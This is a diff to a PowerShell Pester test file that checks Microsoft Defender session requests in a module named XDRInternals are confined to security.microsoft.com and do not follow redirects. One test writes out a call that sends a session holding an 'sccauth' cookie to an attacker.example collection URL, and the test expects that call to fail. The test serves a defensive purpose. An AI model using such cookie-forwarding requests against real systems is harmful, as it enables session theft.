@@ -64,6 +64,30 @@
 }
 
 Describe 'Defender authenticated request boundaries' {
+    It 'rejects direct Defender-session requests to an untrusted host' {
+        InModuleScope XDRInternals {
+            $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
+            $session.Cookies.Add([System.Net.Cookie]::new('sccauth', 'secret', '/', 'security.microsoft.com'))
+
+            {
+                Invoke-RestMethod -Uri 'https://attacker.example/collect' -WebSession $session -Headers @{}
+            } | Should -Throw '*only be sent to https://security.microsoft.com*'
+        }
+    }
+
+    It 'disables redirects for Defender sessions and authorization headers' {
+        InModuleScope XDRInternals {
+            $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
+            $session.Cookies.Add([System.Net.Cookie]::new('sccauth', 'secret', '/', 'security.microsoft.com'))
+
+            $defenderParameters = Protect-XdrHttpRequest -Uri 'https://security.microsoft.com/api' -WebSession $session -Headers @{} -Parameters @{}
+            $bearerParameters = Protect-XdrHttpRequest -Uri 'https://vault.azure.net/keys/key/sign' -Headers @{ Authorization = 'Bearer secret' } -Parameters @{}
+
+            $defenderParameters.MaximumRedirection | Should -Be 0
+            $bearerParameters.MaximumRedirection | Should -Be 0
+        }
+    }
+
     It 'rejects an untrusted host before updating or sending the authenticated session' {
         Mock Update-XdrConnectionSettings {} -ModuleName XDRInternals
         Mock Invoke-RestMethod { throw 'must not be called' } -ModuleName XDRInternals
